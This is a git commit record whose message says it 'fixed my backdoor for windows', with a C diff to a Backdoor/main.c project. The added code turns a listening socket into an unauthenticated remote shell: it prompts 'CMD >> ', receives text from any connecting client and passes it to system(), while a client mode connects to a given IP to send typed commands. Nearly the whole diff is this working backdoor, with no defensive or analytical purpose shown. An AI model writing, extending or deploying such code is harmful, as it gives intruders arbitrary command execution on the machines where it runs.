ce874e50606733be58e2a653da03000418cba50b
Philip R. Simonson <drunkenmaster1988@gmail.com>
2017-05-04 20:08:10 -0400

    Fixed my backdoor for windows. Works now.

--- cblocks_projects/Backdoor/main.c
+++ cblocks_projects/Backdoor/main.c
@@ -75,26 +75,28 @@ char **argv;
 			struct sockaddr_in client;
 			int clientlen = sizeof(client);
 			char message[256];
+			char buf[MAXBUF];
 
 			/* accept connection */
 			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
 			if(clientfd>0) {
+				int bytes;
 				pzero(message, sizeof(message));
 				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
 					client.sin_port);
 				puts(message);
-				dup(0);
-				dup(1);
-				dup(2);
-				execlpe(PROGRAM_NAME, NULL, NULL);
+				do {
+					if(send(clientfd, "CMD >> ", 8, 0) < 0)
+						puts("Error: sending data.");
+					bytes=recv(clientfd, buf, MAXBUF, 0);
+					if(strncmp(buf, "", 1)!=0) { dup(1); dup(2); system(buf); }
+					else send(clientfd, "Error: no command entered.", strlen("Error: no command entered."), 0);
+				} while(bytes > 0);
 				if(closesocket(clientfd)==0) {
 					pzero(message, sizeof(message));
 					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
 						client.sin_port);
 					puts(message);
-					close(0);
-					close(1);
-					close(2);
 				}
 			}
 		}
@@ -102,28 +104,25 @@ char **argv;
 		closesocket(sockfd);
 	} else if(argc == 2) {
 		char buf[MAXBUF];
-		int bytes;
 		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
-
-		pzero(buf, sizeof(buf)/sizeof(char));
 		pzero(&self, sizeof(self));
 		self.sin_family = AF_INET;
-		self.sin_port = MY_PORT;
+		self.sin_port = htons(MY_PORT);
 		self.sin_addr.s_addr = inet_addr(argv[1]);
 
         TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
 
         while(1) {
-        	char reply[2000];
-        	bytes=0;
-        	pzero(reply, sizeof(reply)/sizeof(char));
-        	if((bytes=recv(sockfd, reply, bytes, 0)) < 0) {
-        		puts("Error: couldn't receive data.");
-			}
-			scanf("%[^\n]", buf);
-			if((bytes=send(sockfd, buf, MAXBUF, 0)) < 0)
-				puts("Error: sending data.");
+        	char reply[MAXBUF];
         	pzero(buf, sizeof(buf)/sizeof(char));
+        	pzero(reply, sizeof(reply)/sizeof(char));
+
+        	fflush(stdin);
+        	if((recv(sockfd, reply, MAXBUF, 0)) < 0)
+        		puts("Could not recv data.");
+        	scanf("%[^\n]s", buf);
+			if((send(sockfd, buf, MAXBUF, 0)) < 0)
+				puts("Could not send data.");
         }
         closesocket(sockfd);
 	} else {
